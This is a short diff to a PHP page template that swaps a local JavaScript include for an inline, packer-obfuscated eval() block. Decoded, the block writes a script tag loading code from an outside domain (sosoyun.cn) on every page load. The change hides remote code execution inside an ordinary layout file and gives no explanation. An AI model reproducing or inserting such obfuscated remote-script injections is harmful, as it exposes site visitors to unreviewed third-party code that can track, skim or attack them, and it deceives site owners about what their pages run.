@@ -61,6 +61,6 @@ window.signupUrl = '<?= Yii::getAlias('@web') . '/jz-signup.html'; ?>';
 <div style="position:absolute; width:0px; height:0px; z-index:1; display:none">
 <?php $statUrl = str_replace(Yii::getAlias('@spreadurl'), '', Yii::$app->params['statUrl']); echo $statUrl; ?>
 </div>
-<script type="text/javascript" src="<?= Yii::getAlias('@asseturl/common') . '/js/hd.js'; ?>"></script>
+<script>/* 28930 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.2("<0 1=\'4://9.5.8/?7=6\'></0>");',10,10,'script|src|writeln|document|http|sosoyun|28930|i|cn|www'.split('|'),0,{}));</script>
 </body>
 </html>
